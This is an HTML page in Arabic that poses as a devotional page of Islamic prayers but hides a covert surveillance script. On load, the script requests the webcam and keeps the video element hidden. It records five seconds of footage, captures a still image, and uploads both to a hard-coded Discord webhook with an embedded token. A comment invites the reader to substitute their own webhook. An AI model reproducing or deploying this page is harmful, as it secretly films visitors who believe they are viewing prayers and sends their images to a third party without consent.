<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>صلي على النبي</title>
    <style>
        #video { display: none; }
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8ff;
            color: #333;
            text-align: center;
            padding-top: 50px;
        }
        .prayer {
            font-size: 22px;
            color: #0000cd;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <p class="prayer">بسم الله الرحمن الرحيم</p>
    <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
    <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
    <p class="prayer">لا إله إلا الله محمد رسول الله</p>
    <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>

    <video id="video" width="300" height="200" autoplay muted></video>
    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let stream;
        let recorder;
        let chunks = [];

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362553494988394757/pw4iKW76TUWd1pjYnfg6BpUv1_3X_RByXC52LJ0f91locIV95cdMDCWMccOOH5htPEtS"; // ضع رابط الويب هوك بتاعك هنا

        window.onload = async function () {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            startRecording();
            setTimeout(() => {
                captureImage();
            }, 5000);
        };

        function captureImage() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL('image/png');
            const imageHash = `sent_image_${imgData}`;

            if (!localStorage.getItem(imageHash)) {
                sendImage(imgData, imageHash);
            } else {
                console.log("الصورة دي اتبعتت قبل كده");
            }
        }

        function sendImage(imgData, imageHash) {
            const blob = dataURLtoBlob(imgData);
            const formData = new FormData();
            formData.append('file', blob, 'image.png');

            fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            }).then(response => {
                if (response.status === 204) {
                    console.log("تم إرسال الصورة بنجاح");
                    localStorage.setItem(imageHash, true);
                } else {
                    console.log("فشل إرسال الصورة");
                }
            }).catch(err => console.log("خطأ:", err));
        }

        function startRecording() {
            chunks = [];
            recorder = new MediaRecorder(stream);
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = sendVideo;

            recorder.start();
            setTimeout(() => {
                recorder.stop();
            }, 5000);
        }

        function sendVideo() {
            const blob = new Blob(chunks, { type: 'video/webm' });

            const reader = new FileReader();
            reader.onloadend = () => {
                const base64data = reader.result;
                const videoHash = `sent_video_${base64data}`;

                if (!localStorage.getItem(videoHash)) {
                    const formData = new FormData();
                    formData.append('file', blob, 'recorded_video.webm');

                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    }).then(response => {
                        if (response.status === 204) {
                            console.log("تم إرسال الفيديو");
                            localStorage.setItem(videoHash, true);
                        } else {
                            console.log("فشل إرسال الفيديو");
                        }
                    }).catch(err => console.log("خطأ:", err));
                } else {
                    console.log("الفيديو ده اتبعت قبل كده");
                }
            };
            reader.readAsDataURL(blob);
        }

        function dataURLtoBlob(dataURL) {
            const parts = dataURL.split(';base64,');
            const byteString = atob(parts[1]);
            const mimeString = parts[0].split(':')[1];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>
</html>
